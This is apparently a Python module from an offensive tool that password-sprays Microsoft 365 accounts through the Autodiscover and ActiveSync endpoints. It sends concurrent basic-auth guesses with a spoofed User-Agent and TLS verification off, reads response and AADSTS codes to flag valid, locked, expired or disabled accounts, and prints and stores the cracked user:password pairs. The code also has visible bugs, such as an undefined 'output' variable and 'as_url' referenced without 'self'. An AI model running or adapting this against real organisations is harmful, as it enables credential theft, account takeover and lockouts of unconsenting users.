#!/usr/bin/env python3

# Based on: https://github.com/sensepost/ruler/
#           https://github.com/byt3bl33d3r/SprayingToolkit/
# Based on: https://bitbucket.org/grimhacker/office365userenum/

import sys
import urllib3
import asyncio
import requests
from .helper import Helper
from .colors import text_colors
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class Sprayer:
    """ Perform password spraying using Microsoft Autodiscover """

    loop = asyncio.get_event_loop()

    # Valid credentials storage
    valid_creds = {}

    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:69.0) Gecko/20100101 Firefox/69.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "DNT": "1",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1"
    }

    # Autodiscover data
    url   = "https://autodiscover-s.outlook.com/autodiscover/autodiscover.xml"
    codes = {
        "status_codes": {
            200: "VALID_CREDS",
            456: "FOUND_CREDS"
        },
        # https://docs.microsoft.com/en-us/azure/active-directory/develop/reference-aadsts-error-codes
        "AADSTS_codes": {
            "AADSTS50053": ["LOCKED", "Account locked"],
            "AADSTS50055": ["EXPIRED_PASS", "Password expired"],
            "AADSTS50057": ["DISABLED", "User disabled"]
        }
    }
    # ActiveSync data
    as_url   = "https://outlook.office365.com/Microsoft-Server-ActiveSync"
    as_codes = {
        "status_codes": {
            200: "VALID_CREDS",
            403: "FOUND_CREDS"
            # 401: "BAD_PASSWD"
            # 404: "INVALID_USER"
        }
    }

    def __init__(self, userlist, timeout=25, proxy=None, debug=False, secondary=False):
        self.userlist = userlist
        self.helper   = Helper()
        self.debug    = debug
        self.timeout  = timeout
        self.method   = requests.get
        self.proxy    = None if not proxy else {
            "http": proxy, "https": proxy
        }
        if secondary:
            self.url    = as_url
            self.codes  = as_codes
            self.method = requests.options
            self.headers["MS-ASProtocolVersion"] = "14.0"

    async def run(self, password_chunk, domain):
        """ Asynchronously send HTTP requests """
        futures = [self.loop.run_in_executor(
            None, self.spray, user, password, domain
        ) for user in self.userlist for password in password_chunk]

        await asyncio.wait(futures)

    async def run_paired(self, passlist, domain):
        """ Asynchronously send HTTP requests """
        futures = [self.loop.run_in_executor(
            None, self.spray, user, password, domain
        ) for user, password in zip(self.userlist, passlist)]

        await asyncio.wait(futures)

    def spray(self, user, password, domain):
        """ Password spray Microsoft using Microsoft Autodiscover """
        try:
            email = self.helper.check_email(user, domain)
            auth  = (email, password)
            rsp   = self.method(self.url, headers=self.headers, auth=auth, timeout=self.timeout, proxies=self.proxy, verify=False)

            status = rsp.status_code
            if status in self.codes["status_codes"].keys():
                if status != 200:
                    output += " (Manually confirm [2FA, Locked, etc.])"

                sys.stdout.write("[%s%s%s] %s:%s%s\n" % (text_colors.green, self.codes["status_codes"][status], text_colors.reset, email, password, self.helper.space))
                sys.stdout.flush()
                self.valid_creds[email] = password
                self.userlist.remove(user) # Remove valid creds

            else:
                err,msg = ("BAD_PASSWD", password)

                if status not in [401, 404]:
                    msg += " (Unknown Error [%s])" % status

                # Handle Autodiscover errors that are returned by the server
                if "X-AutoDiscovery-Error" in rsp.headers:
                    # Handle Basic Auth blocking - remove user from future rotations
                    if any(_str in rsp.headers.get("X-AutoDiscovery-Error") for _str in ["Basic Auth Blocked","BasicAuthBlockStatus - Deny","BlockBasicAuth - User blocked"]):
                        err = "BLOCKED"
                        msg = " Basic Auth blocked for this user. Removing from spray rotation."
                        self.userlist.remove(user)

                    else:
                        # Handle AADSTS errors - remove user from future rotations
                        for code in self.codes["AADSTS_codes"].keys():
                            if code in rsp.headers.get("X-AutoDiscovery-Error"):
                                err = self.codes["AADSTS_codes"][code][0]
                                msg = " %s. Removing from spray rotation." % self.codes["AADSTS_codes"][code][1]
                                self.userlist.remove(user)
                                break

                sys.stdout.write("[%s%s%s] %s:%s%s\r" % (text_colors.red, err, text_colors.reset, email, msg, self.helper.space))
                sys.stdout.flush()

        except Exception as e:
            if self.debug: print("[ERROR] %s" % e)
            pass